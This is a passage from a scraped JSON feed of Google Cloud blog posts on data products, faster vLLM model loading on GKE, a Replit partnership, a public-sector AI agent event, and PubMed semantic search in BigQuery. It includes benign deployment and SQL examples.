capabilities at Virgin Media O2. </span></em><span style=\"vertical-align: baseline;\"><em>This evolution allows us to treat our data as a true product, complete with the rich context of data contracts, clear data lineage, and the enhanced metadata. This streamlined workflow empowers our teams to get the data they need faster, accelerating our data-driven decision-making.\"</em> -</span><span style=\"vertical-align: baseline;\"> <strong>Jonathan Ford, Director, Data Applications, Virgin Media O2</strong></span></span></p>\n<h3><strong style=\"vertical-align: baseline;\">How data products fuel AI and agents</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We believe data products are foundational to the adoption of AI and agentic technologies, helping organizations go from managing individual data assets to delivering value-driven logical units. Data products  fuel AI and agentic innovation by:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Providing high-quality, business-ready data: </strong><span style=\"vertical-align: baseline;\">Because data products are pre-curated with assets that solve a specific business problem, they can help ensure that AI agents be trained and operate on data that has already been cleansed, organized, and aligned with business objectives.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Grounding agents with rich context for accurate insights: </strong><span style=\"vertical-align: baseline;\">A key challenge in AI is grounding, the ability to connect the model's output to verifiable sources of information, reducing the likelihood of generating false or misleading content. Data producers can enrich data products with a wealth of contextual information, including comprehensive documentation, contracts and other metadata, providing a solid foundation for AI agents to base their responses on. </span></li>\n<li><strong style=\"vertical-align: baseline;\">Powering conversational AI and actionable insights: </strong><span style=\"vertical-align: baseline;\">By combining high-quality data and rich context, data products can fuel conversational AI. When a user interacts with an AI agent that leverages a data product, the agent can provide more relevant and nuanced responses.</span></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Using the same example of \"Marketing campaign analysis\" above, a data product that includes detailed documentation with business context, sample queries and schema definition for ad_spend_daily and customer_conversions, allows an AI agent to \"read\" this context and provide more accurate responses. </span></p>\n<p><span style=\"vertical-align: baseline;\">Ready to get started? To learn more about data products in Dataplex Universal Catalog, check out the documentation </span><a href=\"https://docs.cloud.google.com/dataplex/docs/data-products-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-12-04 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/containers-kubernetes/nvidia-runai-model-streamer-supports-cloud-storage/",
        "title": "Accelerate model downloads on GKE with NVIDIA Run:ai Model Streamer",
        "thumbnail": null,
        "author": "Brian Kaufman",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">As large language models (LLMs) continue to grow in size and complexity, the time it takes to load them from storage to accelerator memory for inference can become a significant bottleneck. This \"cold start\" problem isn't just a minor delay — it's a critical barrier to building resilient, scalable, and cost-effective AI services. Every minute spent loading a model is a minute a GPU is sitting idle, a minute your service is delayed from scaling to meet demand, and a minute a user request is waiting.</span></p>\n<p><span style=\"vertical-align: baseline;\">Google Cloud and NVIDIA are committed to removing these barriers. We’re excited to highlight a powerful, open-source collaboration that helps AI developers do just that: the NVIDIA Run:ai Model Streamer now comes with native </span><a href=\"https://cloud.google.com/storage/docs/introduction\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Storage</span></a><span style=\"vertical-align: baseline;\"> support, supercharging vLLM inference workloads on Google Kubernetes Engine (GKE). Accessing data for AI/ML from Cloud Storage on GKE has never been faster!</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_uEwzVCo.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The chart above shows how quickly the model streamer can fetch a 141GB Llama 3.3-7 70B model from Cloud Storage as compared to the default vLLM model loader (lower is better). </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Boost resilience and scalability with fewer cold starts</strong></h3>\n<p><span style=\"vertical-align: baseline;\">For an inference server running on Kubernetes, a \"cold start\" involves several steps: pulling the container image, starting the process, and — most time-consuming of all — loading the model weights into GPU memory. For large models, this loading phase can take many minutes, with painful consequences such as slow auto-scaling and idling GPUs as they wait for the workload to start up. </span></p>\n<p><span style=\"vertical-align: baseline;\">By streaming the model into GPU memory, the model streamer slashes potentially the most time-consuming part of the startup process. Instead of waiting for an entire model to be downloaded before loading, the streamer fetches model tensors directly from object storage and streams them concurrently to GPU memory. This dramatically reduces model loading times from minutes to seconds.  </span></p>\n<p><span style=\"vertical-align: baseline;\">For workloads that rely on model parallelism— where a single model is partitioned and executed across multiple GPUs— the model streamer goes a step further. Its distributed streaming capability is optimized to take full advantage of </span><a href=\"https://www.nvidia.com/en-us/data-center/nvlink/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">NVIDIA NVLink</span></a><span style=\"vertical-align: baseline;\">, using high-bandwidth GPU-to-GPU communication to coordinate loading across multiple processes. Reading the weights from storage is divided efficiently and evenly across all participating processes, with each one fetching a portion of the model weights from storage and then sharing its segment with the others over NVLink. This allows even multi-GPU deployments to benefit from faster startups and fewer cold-start bottlenecks.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Performance and simplicity</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The latest updates to the Model Streamer introduce first-class support for Cloud Storage, creating an integrated and high-performance experience for Google Cloud users. This integration is designed to be simple, fast, and secure, especially for workloads running on GKE.</span></p>\n<p><span style=\"vertical-align: baseline;\">For users of popular inference servers like </span><a href=\"https://docs.vllm.ai/en/stable/models/extensions/runai_model_streamer.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vLLM</span></a><span style=\"vertical-align: baseline;\">, enabling the streamer is as simple as adding a single flag to your vLLM command line:</span></p>\n<p><code style=\"vertical-align: baseline;\"> </code><code style=\"vertical-align: baseline;\">--load-format=runai_streamer</code></p>\n<p><span style=\"vertical-align: baseline;\">Here’s how easy it is to launch a model stored in a Cloud Storage bucket with vLLM:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;vllm serve gs://your-gcs-bucket/path/to/your/model \\r\\n--load-format=runai_streamer&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f12ec53f070&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The NVIDIA Run:ai Model Streamer is a key component for Vertex AI Model Garden's large model deployments. With container image streaming and model weight streaming, we have been able to significantly improve the first deployment and autoscaling experience for our users, and the efficiency of NVIDIA GPUs.</span></p>\n<p><span style=\"vertical-align: baseline;\">When running on GKE, the Model Streamer can automatically use the cluster's </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Workload Identity</strong></a><span style=\"vertical-align: baseline;\">. This means you no longer need to manually manage and mount service account keys, simplifying your deployment manifests and enhancing your security posture. The following deployment manifest shows how to launch a container serving Llama3 70B on GKE. We have added the model loader </span><a href=\"https://docs.vllm.ai/en/stable/models/extensions/runai_model_streamer/#tunable-parameters\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">distributed</span></a><span style=\"vertical-align: baseline;\"> option to accelerate loads when model parallelism &gt; 1:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;apiVersion: apps/v1\\r\\nkind: Deployment\\r\\n…\\r\\n   spec:\\r\\n     serviceAccountName: gcs-access\\r\\n     containers:\\r\\n       - args:\\r\\n           - --model=gs://your-gcs-bucket/path/to/your/model \\r\\n           - --load-format=runai_streamer\\r\\n \\t\\t- --model-loader-extra-config={&quot;distributed&quot;:true}\\r\\n\\t\\t…\\r\\n         command:\\r\\n           - python3\\r\\n           - -m\\r\\n           - vllm.entrypoints.openai.api_server\\r\\n         image: vllm/vllm-openai:latest\\r\\n         ….&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f12ec53fd90&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">That’s it! The streamer handles the rest, auto-tuning streaming concurrency to match your VM’s performance. For more details, see the documentation on </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/persistent-volumes/run-ai-model-streamer\"><span style=\"text-decoration: underline; vertical-align: baseline;\">optimizing vLLM model loading on GKE</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Combining NVIDIA Run:ai Model Streamer with Cloud Storage Anywhere Cache</strong></h3>\n<p><a href=\"https://cloud.google.com/storage/docs/anywhere-cache\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Anywhere Cache</span></a><span style=\"vertical-align: baseline;\"> provides zonally co-located SSD-backed caching for data stored in a regional or multi-regional Cloud Storage bucket. Reducing latency by up to 70% and providing up to 2.5 TB/s of read throughput, Anywhere Cache is a great solution for scale-out inference workloads where the same model is downloaded multiple times across a series of nodes. Together, Anywhere Cache server-side acceleration, along with the NVIDIA Run:ai Model Streamer’s client-side acceleration, create an easy-to-manage, extremely performant model-loading system.  </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The NVIDIA Run:ai Model Streamer is evolving into a critical piece of the AI infrastructure puzzle, enabling teams to build faster, more resilient, and more flexible MLOps pipelines on GKE. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">To learn more about how to use the model streamer on GKE see our </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/persistent-volumes/run-ai-model-streamer\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE NVIDIA Run:ai Guide</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">For detailed instructions on using the streamer with vLLM, see the</span><a href=\"https://docs.vllm.ai/en/stable/models/extensions/runai_model_streamer.html\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">official vLLM documentation</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\">To learn more and contribute to the model streamers ongoing development check out the </span><a href=\"https://github.com/run-ai/runai-model-streamer\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">NVIDIA Run:ai Model Streamer project on GitHub</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n</ul></div>",
        "published_date": "2025-12-04 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/bringing-vibe-coding-to-the-enterprise-with-replit/",
        "title": "Replit is delivering enterprise-grade vibe coding with Google Cloud",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Replit-partnership-expansion-enterprise-grad.max-600x600.png",
        "author": "Matt Renner",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><a href=\"https://cloud.google.com/discover/what-is-vibe-coding\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vibe coding</span></a><span style=\"vertical-align: baseline;\"> has been </span><a href=\"https://cloud.google.com/transform/how-vibe-coding-can-help-leaders-move-faster\"><span style=\"text-decoration: underline; vertical-align: baseline;\">all the rage</span></a><span style=\"vertical-align: baseline;\"> this year. Using AI to build novel apps and create dynamic websites simply by typing conversationally into a chat interface can seem magical — yet it’s largely remained the domain of individual developers, not larger business teams. </span></p>\n<p><span style=\"vertical-align: baseline;\">Today, Replit and Google Cloud are expanding their </span><a href=\"https://blog.replit.com/google-partnership\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">strategic partnership</span></a><span style=\"vertical-align: baseline;\"> to bring vibe coding capabilities to enterprise developers and teams.</span></p>\n<p><span style=\"vertical-align: baseline;\">Google Cloud was Replit’s first cloud partner, and its popular platform for AI coding continues to run on top of Google Cloud’s infrastructure, utilizing multiple Google Cloud services and integrating </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google’s Gemini models</span></a><span style=\"vertical-align: baseline;\"> through </span><a href=\"http://cloud.google.com/vertex-ai/\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\">Now, Replit is extending its partnership with Google Cloud with a new, multi-year agreement that will grow its usage of infrastructure and cloud services; further integrate Google’s models into its platform; and jointly support vibe coding use cases for enterprise customers. Just last month, Replit integrated Gemini 3 into its </span><a href=\"https://www.reddit.com/r/replit/comments/1p0vb11/introducing_design_mode_in_replit/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">new Design mode</span></a><span style=\"vertical-align: baseline;\"> to </span><a href=\"https://www.reddit.com/r/replit/comments/1p0vb11/introducing_design_mode_in_replit/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">positive reception</span></a><span style=\"vertical-align: baseline;\">. Under the terms of the expanded deal:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Google Cloud will continue to be the primary cloud provider for Replit, and services like </span><a href=\"https://cloud.google.com/run\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Run</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"http://cloud.google.com/gke\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Kubernetes Engine</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://cloud.google.com/bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery</span></a><span style=\"vertical-align: baseline;\"> will underpin its applications and enable further scale as the company grows.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Google models, including Gemini 3, 2.5 Flash Lite, 2.5 Flash, and Imagen 4, are now supported on Replit, powering both coding and multimodal use cases — and driving significant token usage to Google Cloud. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Replit and Google Cloud will partner to help enterprise customers embrace vibe coding and help their developers be more productive — through joint go-to-market on Google Cloud Marketplace and through Google Cloud’s extensive co-sell programs.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">“Our growing partnership will deliver more capabilities to Replit’s users through deeper integrations with our AI and cloud services,” Google Cloud CEO Thomas Kurian said, “and will accelerate the adoption of vibe coding in the enterprise by bringing Replit's easy-to-use AI tools, powered by Google Cloud AI, to more organizations.\"</span></p>\n<p><span style=\"vertical-align: baseline;\">Amjad Masad, co-founder and CEO of Replit, said: “Our mission is to enable the next billion software creators — from hobbyists to entrepreneurs to enterprises. Over the last few months, we have seen fantastic adoption in businesses, especially in the Fortune 1000. Today’s expanded partnership with Google will enable us to scale faster and more deeply as we integrate Google’s offerings with ours – the work is just beginning.”</span></p>\n<p><span style=\"vertical-align: baseline;\">You can read more about how customers are using Google’s AI models for coding use cases </span><a href=\"https://cloud.google.com/use-cases/ai-code-generation\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">, and join Replit and other customers in </span><a href=\"https://console.cloud.google.com/vertex-ai/studio/multimodal\"><span style=\"text-decoration: underline; vertical-align: baseline;\">building with Gemini 3 via Vertex AI</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-12-04 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/public-sector/the-agentic-era-is-here-300-ai-agents-built-in-one-day-at-google-public-sector-summit-to-accelerate-impact-and-advance-missions/",
        "title": "The agentic era is here: 300+ AI agents built in one day at Google Public Sector Summit to accelerate impact and advance missions",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Agentic_AI_blog_header_1.max-600x600.jpg",
        "author": "Katharyn White",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>The future of public service hinges on two things: accelerating mission outcomes and empowering the public sector workforce. With budget constraints and rising citizen expectations, government leaders can no longer wait for innovation—they must create it.</p><p>We surveyed eight industries as part of our <a href=\"https://cloud.google.com/resources/content/roi-of-ai-2025?e=48754805\">Return On Investment of AI Report</a>, and found that among public sector respondents who report productivity gains from gen AI, nearly half (46%) say their productivity has at least doubled. And 42% of public sector respondents report their organization has deployed more than 10 AI agents. This is a new era and the public sector is helping lead it.</p><p>We believe that intelligent, mission specific agents are the future - and will help accelerate discovery, automate complex tasks, and break down data silos. This is the core principle behind our bold campaign, <a href=\"https://www.linkedin.com/posts/google-public-sector_100daysofagents-activity-7361034226189688833-Vdou?utm_source=share&amp;utm_medium=member_desktop&amp;rcm=ACoAAAQrrHgBFbakiutyYbbhnuH5PM5n0ASIpwA\" target=\"_blank\">#100DaysOfAgents</a>.</p><h3><b>Reimagine your mission: From inspiration to action</b></h3><p>We launched our #100DaysOfAgents campaign 100 days prior to our Google Public Sector Summit, to show real-world examples of AI in action. On our <a href=\"https://www.linkedin.com/posts/google-public-sector_100-days-of-agents-activity-7379591552295403521-PhC0?utm_source=share&amp;utm_medium=member_desktop&amp;rcm=ACoAAAQrrHgBFbakiutyYbbhnuH5PM5n0ASIpwA\" target=\"_blank\">Google Public Sector Linkedin page</a>, we challenged public sector leaders to change the question from \"what if?\" to \"how do we build this?\"</p><p>Through this campaign, we aimed to demonstrate exactly how AI can empower specific public sector roles and agencies in this new era of innovation.</p><ul><li>AI agents can help provide veterans and their families with easy access to the benefits, healthcare, and support services they've earned.</li><li>AI agents can help translate dense medical diagnoses into easy-to-understand information about treatment options and clinical trials.</li><li>AI agents can help biomedical research by simplifying analysis of complex data using secure and scalable computing power to make life-changing discoveries.</li><li>AI agents can help break down complex data, enable effective collaboration, and make it easier to stay ahead of threats to keep our communities safe.</li></ul><h3><b>Mission District: Where inspiration meets agent prototypes</b></h3><p>The campaign culminated at our interactive \"Mission District\" activation at the<a href=\"https://cloudonair.withgoogle.com/events/public-sector-summit-2025\" target=\"_blank\"> Google Public Sector Summit</a> on October 29th, 2025 in Washington D.C. After inviting the attendees to imagine the possibilities online, attendees were able to walk through a physical showcase filled with dozens of AI agent use cases, ideas, and inspiration. Via self-serve Agent builder stations, hundreds of leaders from across government and education were able to build custom AI agents that were tailored to their specific challenges.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Header for Agentic Ai\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Header_for_Agentic_Ai.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>We generated <a href=\"https://gpsagentgallery.com/\" target=\"_blank\">300+ unique AI agent prototypes</a> through the self-serve stations* and Summit labs and workshops. These agents address real-world challenges across every domain, empowering roles from the analyst to the public health researcher:</p><ul><li><b>Lowering Costs:</b> The <a href=\"https://gpsagentgallery.com/d82fe5c9-b0c5-488c-9a76-5dbeba091ca0\" target=\"_blank\">Grid Optimization Analyst</a> analyzes grid congestion data and suggests mitigation strategies to reduce electricity congestion costs.</li><li><b>Improving Efficiency:</b> This <a href=\"https://gpsagentgallery.com/ce432a92-7483-4f7d-a753-eda9476f8be7\" target=\"_blank\">Water System Transition Planner</a> creates detailed action plans for public water systems transitioning from chlorine dioxide to sodium hypochlorite disinfection.</li><li><b>Enhancing Access:</b> This <a href=\"https://gpsagentgallery.com/2b89a75e-59f9-4845-ad8a-d3bb895688e2\" target=\"_blank\">NIH Access Assistant</a> simplifies access to NIH resources and information for the public.</li></ul><p>Throughout our programming, we also shared examples of AI agents that are already in place, driving efficiencies. Elizabeth Moon, Managing Director of Customer Engineering at Google Public Sector led an interactive session featuring agency leaders working with AI agents that are helping advance their missions. That session and others from Google Public Sector Summit are now <a href=\"https://cloudonair.withgoogle.com/events/public-sector-summit-2025\" target=\"_blank\">available on demand</a>.</p><p><i>*Note: Agents added to the agent library are not in production and for illustrative purposes only</i></p><h3><b>The final step: Let's build your agent</b></h3><p>Through the #100DaysOfAgents campaign, we learned that the public sector has an enormous appetite and drive for learning about AI, and how AI agents can significantly speed up their paths to mission success.</p><p>By partnering with a <a href=\"https://cloud.google.com/contact?e=48754805\">Google expert</a>, we can help you imagine the possibilities, and transition your inspiring agent idea into a working prototype, leveraging Gemini for Government and our secure, integrated full-stack approach to AI. This collaborative approach means you can go from concept to a working prototype, immediately.</p><p>Our AI agent activation is coming to <a href=\"https://www.googlecloudevents.com/next-vegas\" target=\"_blank\">Google Cloud Next</a> in April, and we invite you to join us there to experience the process yourself. Don't wait to turn your strategic vision into a working reality:</p><ol><li><a href=\"https://gpsagentgallery.com/\" target=\"_blank\"><b>Browse the agent gallery</b></a><b>:</b> See what others have built, and get inspired about what’s possible</li><li><a href=\"https://www.skills.google/\" target=\"_blank\"><b>Invest in AI skills and education programs</b></a> that will equip you and your teams to build and manage the next generation of AI agents that drive mission impact.</li><li><a href=\"https://cloud.google.com/blog/topics/public-sector/introducing-gemini-for-government-supporting-the-us-governments-transformation-with-ai/?e=48754805\"><b>Learn more about Gemini for Government,</b></a> the new front door for the best of Google’s AI-optimized, secure and accredited commercial cloud services, our industry-leading Gemini models, and agentic solutions.</li><li><a href=\"https://www.googlecloudevents.com/next-vegas\" target=\"_blank\"><b>Join us at Google Cloud Next</b></a><b>:</b> Register to attend <b>Google Cloud Next in April</b> to meet our experts, refine your prototype, and accelerate your mission.</li></ol><p>We are excited to help you build an AI agent that helps transform the way work is done and missions are achieved, in this most exciting new era of innovation, technology and mission impact.</p></div>",
        "published_date": "2025-12-04 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/public-sector/accelerate-medical-research-with-pubmed-data-now-available-in-bigquery/",
        "title": "Accelerate medical research with PubMed data now available in BigQuery",
        "thumbnail": null,
        "author": "Stone Jiang",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>Medical professionals regularly consult PubMed, a database maintained by the National Library of Medicine (NLM) at the National Institutes of Health (NIH) that contains over 35 million biomedical articles and is growing by 1.5 million articles annually. However, traditional keyword searches may miss crucial connections. A pediatric oncologist treating a rare leukemia mutation might never find a relevant case study from another country simply because it uses slightly different terms. Pharmaceutical companies spend years manually reviewing literature for drug repurposing opportunities. Clinical trial matching remains a manual, time-consuming process that delays patient access to potentially life-saving treatments.</p><p>At Google Cloud, we're addressing this challenge by making PubMed data available as a <a href=\"https://cloud.google.com/datasets\">BigQuery public dataset</a> with vector search capabilities from <a href=\"https://cloud.google.com/vertex-ai\">Vertex AI</a> (both BigQuery and Vertex AI Vector Search are FedRAMP High authorized), enabling semantic search of medical concepts beyond simple keyword matching.</p><h3>Transforming oncological literature reviews with BigQuery</h3><p>The Princess Máxima Center for Pediatric Oncology in the Netherlands developed <a href=\"https://www.youtube.com/watch?v=M5rc4moju7Q&amp;ab_channel=Google\" target=\"_blank\">Capricorn</a>, a system that combines <a href=\"http://console.cloud.google.com/marketplace/product/bigquery-public-data/pmc\">PubMed data in BigQuery</a> with Gemini models to revolutionize their international Leukemia Tumor Board (iLTB). By consolidating medical literature analysis into BigQuery, they can now provide comprehensive literature reviews in minutes rather than hours.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"architecture\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/architecture_N9q8QFO.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>Dr. Uri Ilan, pediatric oncologist at The Princess Máxima Center for Pediatric Oncology explains: <i>\"The power to provide reports summarizing all relevant information in the literature to tumor boards is remarkable. We're now working with partners to develop similar systems for Neuro-Oncology and Neuroblastoma.\"</i></p><p>Other systems like Rutgers Health are now expanding upon this foundation. Dr. David J. Foran, Chief Informatics Officer, who leads the Rutgers team, notes:<i> “Rutgers Cancer Institute is poised to integrate Capricorn with our tumor boards to enable us to access these AI-powered oncology tools and evaluate the performance of the underlying algorithms for personalizing treatment for cancer patients. We will also assess its potential use in our global health initiatives in Botswana.”</i></p><h3>Combining PubMed with BigQuery unlocks new healthcare capabilities</h3><p>Healthcare organizations are discovering other transformative use cases by combining PubMed's comprehensive medical literature with BigQuery's analytics and AI capabilities:</p><p><b>Clinical decision support</b>: Leading pediatric hospitals may use semantic search to match leukemia patients with relevant clinical trials based on complete genetic profiles. Continued collaboration and knowledge sharing through these tools will be essential for advancing precision medicine.</p><p><b>Drug discovery and repurposing</b>: Pharmaceutical companies analyze literature patterns to identify existing drugs that could treat new conditions. Research <a href=\"https://healthpolicy.duke.edu/publications/generic-drug-repurposing-common-diseases-proposal-and-design-pull-mechanism\" target=\"_blank\">indicates</a> repurposed drugs cost 80% less and reach the market 70% faster, and health economist Federico Felizzi <a href=\"https://www.sciencedirect.com/science/article/pii/S1098301522001917\" target=\"_blank\">highlights</a> that machine learning also helps refine the economic assessments needed to validate these candidates. Analyzing citation patterns between drugs can identify thousands of repurposing candidates, transforming a years-long manual process into automated discovery.</p><p><b>Public services</b>: Government health agencies like the FDA can use this repository to synthesize evidence on drug efficacy and food safety, streamlining approvals to ensure a safe domestic food and drug supply while accelerating new therapies and proactively identifying trends in food safety and nutrition to combat chronic disease.</p><p><b>Rare disease diagnosis</b>: Medical institutions can now match complex symptom patterns against global case reports, potentially reducing diagnostic time from years to months for the <a href=\"https://www.thelancet.com/journals/langlo/article/PIIS2214-109X(24)00056-1/fulltext\" target=\"_blank\">300 million people affected by rare diseases.</a></p><p><b>Insurance and payer intelligence</b>: American and European bodies like Germany's G-BA, UK's NICE, and France's HAS leverage comprehensive literature analysis for evidence-based coverage decisions, with literature reviews forming the foundation for health technology assessments and reimbursement decisions across both US and EU markets.</p><h3>Getting started with PubMed data in BigQuery</h3><p>Healthcare organizations can immediately begin leveraging PubMed data in BigQuery. Here's a simple example of how to perform semantic search on medical literature.</p><p>After first <a href=\"https://console.cloud.google.com/flows/enableapi?apiid=aiplatform.googleapis.com\">enabling the Vertex AI API</a> in your Google Cloud project, inside of BigQuery, create a model for text embeddings.</p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;CREATE SCHEMA IF NOT EXISTS models\\r\\nOPTIONS(location=&quot;US&quot;);\\r\\n\\r\\nCREATE MODEL IF NOT EXISTS models.textembed\\r\\nREMOTE WITH CONNECTION DEFAULT\\r\\nOPTIONS(endpoint=&quot;text-embedding-005&quot;);&#x27;), (&#x27;language&#x27;, &#x27;lang-sql&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f12eb9c9400&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph\"><p>Now you’re ready to directly query PubMed Central articles! Here’s an example query:</p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;DECLARE query_text STRING;\\r\\n\\r\\n\\r\\nSET query_text = &quot;&quot;&quot;\\r\\nKMT2A-rearranged AML\\r\\nCNS2 involvement\\r\\nrefractory disease after NOPHO DBH AML 2012 protocol\\r\\n&quot;&quot;&quot;;\\r\\n\\r\\n\\r\\nWITH query_embedding AS (\\r\\n SELECT ml_generate_embedding_result AS embedding_col\\r\\n FROM ML.GENERATE_EMBEDDING(\\r\\n   MODEL models.textembed,\\r\\n   (SELECT query_text AS content),\\r\\n   STRUCT(TRUE AS flatten_json_output)\\r\\n )\\r\\n)\\r\\nSELECT\\r\\n base.pmc_id,\\r\\n base.pmid,\\r\\n base.title,\\r\\n base.author,\\r\\n base.article_text,\\r\\n base.pmc_link,\\r\\n distance\\r\\nFROM VECTOR_SEARCH(\\r\\n TABLE `bigquery-public-data.pmc_open_access_commercial.articles`,\\r\\n \\&#x27;ml_generate_embedding_result\\&#x27;,\\r\\n (SELECT embedding_col FROM query_embedding),\\r\\n top_k =&gt; 15\\r\\n)\\r\\nORDER BY distance ASC;&#x27;), (&#x27;language&#x27;, &#x27;lang-sql&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f12eb8ca4f0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph\"><p>The results will look something like this:</p></div>\n<div 